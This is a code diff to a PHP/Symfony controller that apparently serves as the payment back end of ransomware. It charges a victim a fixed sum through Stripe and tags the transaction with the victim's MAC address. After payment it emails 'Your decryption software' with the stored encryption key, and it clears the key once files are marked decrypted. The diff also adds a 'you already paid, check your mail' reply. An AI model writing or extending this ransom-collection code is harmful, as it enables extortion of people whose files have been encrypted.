@@ -31,18 +31,24 @@ class TransactionController extends BaseController
                 throw $this->createAccessDeniedException();
             }
 
-            // Récupération de la transaction en cours s'il y en a une
-            $transaction = $this->transactionRepository->findLastOneByUserAndStatus(
-                $user,
-                [Transaction::TRANSACTION_STATUS_PAYMENT_INTENT]
-            );
+            $transaction = $this->transactionRepository->findLastOneByUser($user);
 
             if (null === $transaction) {
                 $transaction = (new Transaction())
                     ->setAmount(5000)
                     ->setUser($user)
-                    ->setLabel('Paiement en cours depuis '.$user->getIp())
+                    ->setLabel('Paiement en cours depuis '.$user->getMacAddress())
                     ->setPaymentStatus(Transaction::TRANSACTION_STATUS_PAYMENT_INTENT);
+            } else {
+                if(in_array($transaction->getPaymentStatus(), [
+                    Transaction::TRANSACTION_STATUS_PAYMENT_SUCCESS,
+                    Transaction::TRANSACTION_USER_FILE_DECRYPTED
+                ])) {
+                    return $this->json([
+                        'error' => true,
+                        'message' => "Tu as déjà payé, regarde tes mails !"
+                    ]);
+                }
             }
 
             \Stripe\Stripe::setApiKey($this->getParameter('app.stripe.keys.private'));
@@ -127,8 +133,6 @@ class TransactionController extends BaseController
 
             $transaction->setPaymentMethod(json_encode($userPaymentMethod));
             $this->transactionRepository->save($transaction, true);
-            $user->setEncryptionKey(null);
-            $this->getUserRepository()->save($user, true);
 
             $transaction->setPaymentStatus(Transaction::TRANSACTION_STATUS_PAYMENT_SUCCESS);
             $this->transactionRepository->save($transaction, true);
@@ -137,7 +141,10 @@ class TransactionController extends BaseController
                 'gege@dec.com',
                 $user->getEmail(),
                 'Your decryption software',
-                'emails/decrypt_email.html.twig'
+                'emails/decrypt_email.html.twig',
+                [
+                    'decryptKey' => $user->getEncryptionKey()
+                ]
             );
 
             return $this->json([
@@ -169,6 +176,9 @@ class TransactionController extends BaseController
             }
 
             $transaction->setPaymentStatus(Transaction::TRANSACTION_USER_FILE_DECRYPTED);
+            $user->setEncryptionKey(null);
+
+            $this->getUserRepository()->save($user, true);
             $this->transactionRepository->save($transaction, true);
 
             return $this->json([
